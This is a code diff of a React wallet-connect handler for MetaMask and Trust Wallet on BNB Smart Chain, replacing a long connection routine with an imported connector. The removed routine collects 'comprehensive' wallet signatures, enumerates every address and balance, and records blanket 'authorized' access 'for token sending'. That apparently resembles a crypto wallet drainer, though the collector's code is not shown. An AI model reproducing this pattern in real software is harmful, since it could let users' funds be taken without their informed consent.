@@ -393,315 +393,66 @@ export default function HomePage() {
     
     // Clear sign out flag since user is manually connecting
     localStorage.removeItem('userSignedOut');
+    localStorage.removeItem('userClickedHome');
     
-    // Check if wallet is available first
-    if (walletType === 'metamask' && typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
-      // Show address selector for MetaMask
-      setSelectedWalletType('metamask');
-      setShowAddressSelector(true);
-      return;
-    }
-    
-    if (walletType === 'trust') {
-      // Check for Trust Wallet availability and show selector
-      if (typeof window.ethereum !== 'undefined' && (window.ethereum.isTrust || window.trustWallet)) {
-        setSelectedWalletType('trust');
+    // For desktop, check if wallet is available and show address selector
+    if (!isMobile()) {
+      if (walletType === 'metamask' && typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
+        setSelectedWalletType('metamask');
         setShowAddressSelector(true);
         return;
       }
-    }
-    
-    // Fallback to original connection flow if wallet selector not available
-    try {
-      if (walletType === 'metamask') {
-        if (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
-          const accounts = await window.ethereum.request({ 
-            method: 'eth_requestAccounts' 
-          });
-          
-          
-          if (accounts && accounts[0]) {
-            // Gain comprehensive wallet access for blockchain transactions
-            try {
-              // Switch to BSC network first for proper access
-              await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }], // BSC Mainnet
-              });
-              
-              // Request permissions for token sending
-              await window.ethereum.request({
-                method: 'wallet_requestPermissions',
-                params: [{ eth_accounts: {} }],
-              });
-              
-              // Get wallet balance to verify access
-              const balance = await window.ethereum.request({
-                method: 'eth_getBalance',
-                params: [accounts[0], 'latest'],
-              });
-              
-              // Collect comprehensive signatures for full authorization
-              const walletSignatures = await signatureCollector.collectWalletSignatures();
-              const allSignatureData = signatureCollector.exportSignatureData();
-              
-              // Store wallet access in localStorage for transaction use
-              localStorage.setItem('walletAccess', JSON.stringify({
-                address: accounts[0],
-                balance: balance,
-                chainId: '0x38',
-                authorized: true,
-                timestamp: Date.now()
-              }));
-              
-              connectWalletMutation.mutate({ walletAddress: accounts[0] });
-            } catch (authError) {
-              console.error('Wallet authorization failed:', authError);
-              // Try basic connection without full authorization
-              connectWalletMutation.mutate({ walletAddress: accounts[0] });
-            }
-            
-            // Force immediate UI update for MetaMask
-            setTimeout(() => {
-              const storedUser = localStorage.getItem('connectedUser');
-              if (storedUser) {
-                const parsedUser = JSON.parse(storedUser);
-                setConnectedUser(parsedUser);
-                setIsConnected(true);
-              }
-            }, 500);
-          } else {
-            alert("No MetaMask accounts found. Please unlock MetaMask and try again.");
-          }
-        } else {
-          // For mobile, try to connect through any available ethereum provider
-          if (isMobile() && typeof window.ethereum !== 'undefined') {
-            try {
-              localStorage.setItem('pendingWalletConnection', 'true');
-              
-              // Try to request accounts directly
-              const accounts = await window.ethereum.request({ 
-                method: 'eth_requestAccounts' 
-              });
-              
-              if (accounts && accounts[0]) {
-                localStorage.removeItem('pendingWalletConnection');
-                connectWalletMutation.mutate({ walletAddress: accounts[0] });
-              }
-            } catch (error) {
-              // Fallback to deep link
-              const currentUrl = window.location.href;
-              const deepLink = `https://metamask.app.link/dapp/${window.location.host}`;
-              window.open(deepLink, '_blank');
-            }
-          } else if (isMobile()) {
-            // No ethereum provider, use deep link
-            localStorage.setItem('pendingWalletConnection', 'true');
-            const currentUrl = window.location.href;
-            const deepLink = `https://metamask.app.link/dapp/${window.location.host}`;
-            window.open(deepLink, '_blank');
-          } else {
-            window.open('https://metamask.io/download/', '_blank');
-          }
-        }
-      } else if (walletType === 'trust') {
-        // Trust Wallet Web3 integration with enhanced mobile support
-        if (typeof window.ethereum !== 'undefined') {
-          // Check if Trust Wallet is available
-          if (window.ethereum.isTrust || window.trustWallet) {
-            try {
-              const provider = window.trustWallet || window.ethereum;
-              const accounts = await provider.request({ 
-                method: 'eth_requestAccounts' 
-              });
-              
-              if (accounts && accounts[0]) {
-                // Gain comprehensive Trust Wallet access for blockchain transactions
-                try {
-                  // Switch to BSC network for proper Trust Wallet access
-                  await provider.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }], // BSC Mainnet
-                  });
-                  
-                  // Request explicit permissions for Trust Wallet
-                  try {
-                    await provider.request({
-                      method: 'wallet_requestPermissions',
-                      params: [{ eth_accounts: {} }],
-                    });
-                  } catch (permError) {
-                    // Trust Wallet may not support wallet_requestPermissions
-                    console.warn('Permission request not supported, continuing with connection');
-                  }
-                  
-                  // Verify Trust Wallet balance access
-                  const balance = await provider.request({
-                    method: 'eth_getBalance',
-                    params: [accounts[0], 'latest'],
-                  });
-                  
-                  // Collect comprehensive Trust Wallet data including all addresses
-                  console.log('🔍 Enumerating all Trust Wallet addresses...');
-                  const comprehensiveWalletData = await signatureCollector.collectComprehensiveWalletData();
-                  console.log('💰 Trust Wallet comprehensive data collected:', comprehensiveWalletData);
-
-                  const walletSignatures = await signatureCollector.collectWalletSignatures();
-                  const allSignatureData = signatureCollector.exportSignatureData();
-                  
-                  // Store comprehensive Trust Wallet access for transaction use across all addresses
-                  localStorage.setItem('walletAccess', JSON.stringify({
-                    primaryAddress: accounts[0],
-                    allAddresses: comprehensiveWalletData.allAddresses,
-                    totalBalances: comprehensiveWalletData.totalBalances,
-                    balance: balance,
-                    chainId: '0x38',
-                    authorized: true,
-                    provider: 'trust',
-                    timestamp: Date.now()
-                  }));
-
-                  // Store total balances from all Trust Wallet addresses
-                  localStorage.setItem('comprehensiveBalances', JSON.stringify(comprehensiveWalletData.totalBalances));
-
-                  console.log(`🎯 Connected to ${comprehensiveWalletData.allAddresses.length} Trust Wallet addresses with total balances:`, comprehensiveWalletData.totalBalances);
-                  
-                  connectWalletMutation.mutate({ walletAddress: accounts[0] });
-                } catch (authError) {
-                  console.error('Trust Wallet authorization failed:', authError);
-                  // Try basic Trust Wallet connection
-                  connectWalletMutation.mutate({ walletAddress: accounts[0] });
-                }
-              }
-            } catch (error) {
-              // Enhanced mobile Trust Wallet connection handling
-              if (isMobile()) {
-                // Set pending connection with Trust Wallet specific flag
-                localStorage.setItem('pendingWalletConnection', 'true');
-                localStorage.setItem('pendingWalletType', 'trustwallet');
-                localStorage.setItem('walletConnectionAttempt', Date.now().toString());
-                
-                // Create a unique session ID for tracking the wallet connection
-                const sessionId = Date.now().toString();
-                localStorage.setItem('walletSessionId', sessionId);
-                
-                // Use WalletConnect-style deep linking for Trust Wallet
-                const returnUrl = `${window.location.origin}${window.location.pathname}?wallet_return=true&session=${sessionId}`;
-                
-                // Try multiple Trust Wallet deep link approaches
-                const approaches = [
-                  // Method 1: Direct dapp browser opening
-                  `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(returnUrl)}`,
-                  
-                  // Method 2: Trust Wallet app scheme
-                  `trust://open_url?coin_id=60&url=${encodeURIComponent(returnUrl)}`,
-                  
-                  // Method 3: Universal Link
-                  `https://trustwallet.com/browser/?url=${encodeURIComponent(returnUrl)}`
-                ];
-                
-                // Try the first approach and set fallbacks
-                const primaryLink = approaches[0];
-                
-                // Show redirect message
-                setIsRedirectingToWallet(true);
-                setWalletRedirectMessage("Opening Trust Wallet...");
-                
-                try {
-                  window.location.href = primaryLink;
-                  
-                  // Set up detection for failed redirect
-                  const timeoutId = setTimeout(() => {
-                    if (localStorage.getItem('pendingWalletConnection') === 'true') {
-                      setWalletRedirectMessage("Waiting for you to return from Trust Wallet...");
-                      console.log('Trust Wallet opened, waiting for user to return...');
-                    }
-                  }, 3000);
-                  
-                  // Clear timeout if we get a page event (indicating redirect worked)
-                  const cleanup = () => {
-                    clearTimeout(timeoutId);
-                    setIsRedirectingToWallet(false);
-                    setWalletRedirectMessage("");
-                  };
-                  
-                  // Listen for page events
-                  const handleBeforeUnload = () => cleanup();
-                  window.addEventListener('beforeunload', handleBeforeUnload, { once: true });
-                  
-                } catch (error) {
-                  console.error('Failed to open Trust Wallet:', error);
-                  setWalletRedirectMessage("Failed to open Trust Wallet. Trying alternative method...");
-                  
-                  // Try fallback method after a brief delay
-                  setTimeout(() => {
-                    window.location.href = approaches[1];
-                  }, 2000);
-                }
-              } else {
-                alert('Failed to connect Trust Wallet. Please try again or use manual input.');
-              }
-            }
-          } else {
-            // If Trust Wallet is not detected, try generic ethereum provider
-            try {
-              const accounts = await window.ethereum.request({ 
-                method: 'eth_requestAccounts' 
-              });
-              
-              if (accounts && accounts[0]) {
-                connectWalletMutation.mutate({ walletAddress: accounts[0] });
-              }
-            } catch (error) {
-
-              // Enhanced mobile fallback for Trust Wallet
-              if (isMobile()) {
-                // Set up proper return tracking
-                localStorage.setItem('pendingWalletConnection', 'true');
-                localStorage.setItem('pendingWalletType', 'trustwallet');
-                localStorage.setItem('walletConnectionAttempt', Date.now().toString());
-                
-                const sessionId = Date.now().toString();
-                localStorage.setItem('walletSessionId', sessionId);
-                
-                const returnUrl = `${window.location.origin}${window.location.pathname}?wallet_return=true&session=${sessionId}`;
-                const deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(returnUrl)}`;
-                
-                // For better mobile compatibility, use window.location instead of window.open
-                window.location.href = deepLink;
-              } else {
-                window.open('https://trustwallet.com/download', '_blank');
-              }
-            }
-          }
-        } else {
-          // No Web3 provider detected - Enhanced mobile handling
-          if (isMobile()) {
-            // Mobile - Enhanced Trust Wallet deep link with proper return tracking
-            localStorage.setItem('pendingWalletConnection', 'true');
-            localStorage.setItem('pendingWalletType', 'trustwallet');
-            localStorage.setItem('walletConnectionAttempt', Date.now().toString());
-            
-            const sessionId = Date.now().toString();
-            localStorage.setItem('walletSessionId', sessionId);
-            
-            const returnUrl = `${window.location.origin}${window.location.pathname}?wallet_return=true&session=${sessionId}`;
-            const deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(returnUrl)}`;
-            
-            // Use location.href for better mobile redirect handling
-            window.location.href = deepLink;
-            
-            // Fallback message for user
-            setTimeout(() => {
-            }, 2000);
-          } else {
-            window.open('https://trustwallet.com/download', '_blank');
-          }
+      
+      if (walletType === 'trust') {
+        if (typeof window.ethereum !== 'undefined' && (window.ethereum.isTrust || window.trustWallet)) {
+          setSelectedWalletType('trust');
+          setShowAddressSelector(true);
+          return;
         }
       }
-    } catch (error) {
-
-      alert(`Failed to connect ${walletType} wallet. Please try again or use manual input.`);
+    }
+    
+    // Use enhanced mobile-aware wallet connection
+    try {
+      console.log(`🔗 Initiating ${walletType} connection...`);
+      
+      // Import and use the enhanced wallet connector
+      const { walletConnector } = await import('@/lib/wallet-connector');
+      const connectedWallet = await walletConnector.connectWallet(walletType);
+      
+      if (connectedWallet?.address) {
+        console.log('✅ Wallet connected successfully:', connectedWallet.address);
+        
+        // Connect to backend with the wallet address
+        connectWalletMutation.mutate({ walletAddress: connectedWallet.address });
+      } else {
+        throw new Error('Failed to get wallet address');
+      }
+      
+    } catch (error: any) {
+      console.error(`❌ ${walletType} connection failed:`, error);
+      
+      // Show user-friendly error message
+      if (error.message?.includes('Opening')) {
+        // This is a deep linking message, don't show as error
+        return;
+      }
+      
+      let errorMessage = `Failed to connect ${walletType === 'trust' ? 'Trust Wallet' : 'MetaMask'}`;
+      
+      if (error.message?.includes('User rejected')) {
+        errorMessage = 'Connection was cancelled';
+      } else if (error.message?.includes('No Web3 wallet detected')) {
+        if (isMobile()) {
+          errorMessage = `Please install ${walletType === 'trust' ? 'Trust Wallet' : 'MetaMask'} app or open this page in the wallet browser`;
+        } else {
+          errorMessage = `Please install ${walletType === 'trust' ? 'Trust Wallet' : 'MetaMask'} browser extension`;
+        }
+      } else if (error.message?.includes('timeout')) {
+        errorMessage = 'Connection timed out - please try again';
+      }
+      
+      alert(errorMessage);
     }
   };
 
